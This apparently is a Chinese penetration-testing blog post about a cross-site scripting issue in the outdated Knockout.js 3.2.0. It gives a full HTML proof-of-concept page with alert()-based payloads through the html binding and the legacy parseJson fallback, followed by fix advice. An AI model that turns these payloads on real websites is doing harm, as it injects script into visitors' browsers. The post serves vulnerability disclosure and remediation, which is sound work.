---
title: 【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）
date: 2025-09-09
categories:
  - 渗透测试
image: images/55.webp
---
# 漏洞URL
```
https://xxxx/xx/xxx/knockout/knockout-3.2.0.debug.js
```
# 风险详情
```
攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。
```
# 漏洞证明
## 文件下载
```
通过网盘分享的文件：knockout_xss_test.7z
链接: https://pan.baidu.com/s/1g9cCWf1ryzcP4F3n6qDAnQ 提取码: wtxx 
--来自百度网盘超级会员v4的分享
```
## POC
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Knockout.js 3.2.0 XSS漏洞测试</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
        .test-case { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background-color: #f9f9f9; }
        h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 5px; }
        input[type="text"] { width: 100%; padding: 8px; margin: 10px 0; box-sizing: border-box; }
        button { padding: 10px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #45a049; }
        .result { margin-top: 15px; padding: 10px; background-color: #e8e8e8; border-radius: 4px; }
        .warning { color: #ff4444; font-weight: bold; }
        pre { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; }
        .security-tips { background-color: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin-top: 20px; }
    </style>
    <!-- 引入Knockout.js 3.2.0 -->
    <script src="knockout-3.2.0.debug.js"></script>
</head>
<body>
    <h1>Knockout.js 3.2.0 XSS漏洞测试</h1>
    
    <!-- 测试用例1: HTML绑定XSS漏洞 -->
    <div class="test-case">
        <h2>测试用例1: HTML绑定XSS漏洞</h2>
        <p>Knockout.js的html绑定直接将内容渲染为HTML，没有进行任何转义，这是一个明显的XSS漏洞。</p>
        <p class="warning">⚠️ 注意：请不要在生产环境中使用此绑定处理来自不可信源的数据！</p>
        
        <div>
            <label for="htmlInput">输入可能包含XSS的内容:</label>
            <input type="text" id="htmlInput" data-bind="value: htmlContent">
            <button data-bind="click: updateHtml">更新内容</button>
        </div>
        
        <div class="result">
            <p>渲染结果 (使用html绑定):</p>
            <div data-bind="html: htmlContent"></div>
        </div>
        
        <div class="result">
            <p>安全渲染结果 (使用text绑定):</p>
            <div data-bind="text: htmlContent"></div>
        </div>
        
        <pre>示例Payload: &lt;img src=x onerror=alert('XSS via html binding')&gt;</pre>
    </div>
    
    <!-- 测试用例2: parseJson函数XSS漏洞 -->
    <div class="test-case">
        <h2>测试用例2: parseJson函数XSS漏洞</h2>
        <p>在不支持JSON.parse的旧浏览器中，ko.utils.parseJson使用new Function()来解析JSON，这允许执行任意JavaScript代码。</p>
        <p class="warning">⚠️ 注意：这个漏洞在现代浏览器中不适用，但在IE8等旧浏览器中存在风险！</p>
        
        <div>
            <label for="jsonInput">输入恶意JSON:</label>
            <input type="text" id="jsonInput" value="{\"x\":\"y\"}" data-bind="value: jsonContent">
            <button data-bind="click: parseJson">解析JSON</button>
        </div>
        
        <div class="result" data-bind="text: jsonParseResult"></div>
        
        <pre>示例Payload (仅在旧浏览器中有效): {"x":alert('XSS via parseJson')}</pre>
    </div>
    
    <!-- 安全修复建议 -->
    <div class="security-tips">
        <h2>安全修复建议</h2>
        <ul>
            <li><strong>避免使用html绑定:</strong> 除非完全信任数据源，否则应使用text绑定替代html绑定</li>
            <li><strong>升级Knockout.js版本:</strong> 升级到最新版本，可能包含安全修复</li>
            <li><strong>实施内容安全策略(CSP):</strong> 在服务器端配置CSP头，防止内联脚本执行</li>
            <li><strong>输入验证和转义:</strong> 对所有用户输入进行验证和HTML转义</li>
            <li><strong>使用现代浏览器:</strong> 确保用户使用支持JSON.parse的现代浏览器</li>
            <li><strong>创建自定义安全绑定:</strong> 实现自己的安全HTML绑定，对内容进行过滤</li>
        </ul>
    </div>
    
    <script>
        // 测试ViewModel
        function TestViewModel() {
            var self = this;
            
            // 测试用例1
            self.htmlContent = ko.observable('<img src=x onerror=alert("XSS via html binding")>');
            self.updateHtml = function() {
                // 直接更新内容，不做任何转义
            };
            
            // 测试用例2
            self.jsonContent = ko.observable('{"x":"y"}');
            self.jsonParseResult = ko.observable('');
            
            self.parseJson = function() {
                try {
                    // 保存原始的JSON.parse函数
                    var originalJSONParse = JSON.parse;
                    
                    // 模拟旧浏览器环境 (移除JSON.parse)
                    JSON.parse = undefined;
                    
                    // 尝试解析JSON
                    var result = ko.utils.parseJson(self.jsonContent());
                    self.jsonParseResult('解析成功: ' + JSON.stringify(result));
                    
                    // 恢复原始的JSON.parse函数
                    JSON.parse = originalJSONParse;
                } catch (e) {
                    self.jsonParseResult('解析错误: ' + e.message);
                    // 确保恢复JSON.parse
                    JSON.parse = originalJSONParse;
                }
            };
        }
        
        // 应用绑定
        ko.applyBindings(new TestViewModel());
        
        // 创建一个自定义的安全HTML绑定示例
        ko.bindingHandlers.safeHtml = {
            init: function() {
                return { 'controlsDescendantBindings': true };
            },
            update: function(element, valueAccessor) {
                var html = ko.utils.unwrapObservable(valueAccessor());
                if (html && typeof html === 'string') {
                    // 简单的HTML过滤示例
                    var safeHtml = html
                        .replace(/&/g, '&amp;')
                        .replace(/</g, '&lt;')
                        .replace(/>/g, '&gt;')
                        .replace(/"/g, '&quot;')
                        .replace(/'/g, '&#039;');
                    
                    ko.utils.setHtml(element, safeHtml);
                }
            }
        };
    </script>
</body>
</html>
```
## 测试
下载booknockout-3.2.0.debug.js文件，发现parseJson函数允许执行任意JavaScript代码，编写POC进行复现，如图所示：
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250909154117.png)
# 漏洞修复
```
升级Knockout.js版本: 升级到最新版本。
```